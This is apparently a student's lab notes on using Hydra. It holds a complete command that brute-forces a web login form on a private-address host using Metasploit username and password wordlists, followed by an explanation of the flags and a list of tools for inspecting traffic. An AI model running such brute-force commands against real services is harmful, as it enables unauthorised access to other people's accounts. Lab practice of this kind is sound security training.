## Attempt 1 Hydra

* Open Kali terminal man hydra read options that can be used with this tool.

* Then use this command on the scoreboard

     hydra 192.168.20.100 -V -L /usr/local/share/wordlists/metasploit/usernames.txt -P /usr/local/share/wordlists/metasploit/password.lst http-post-form "/login/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=1bb4kj24fkfnk4kf2ff2wq1evln1; security=low"


## Command explanation

     192.168.20.100 is the host we are analyzing

     -V is verbose mode to log eveything

     -L is the username file location

     -P is the password file location

     http-post-form is the type of request followed by the request params.

     : is used to declare a variable.


## Things that need to be checked

[] The forward slash after login? is it login.php? or just /login/

[] Is the cookie security being posted? If so, what is the value?


## Tools for analysis

* PostMan to view data being sent.

* Burp Suite to view data being sent through the browswer. If you decide to use this ensure to set the proxy of the browser to loop back IP 127.0.0.1



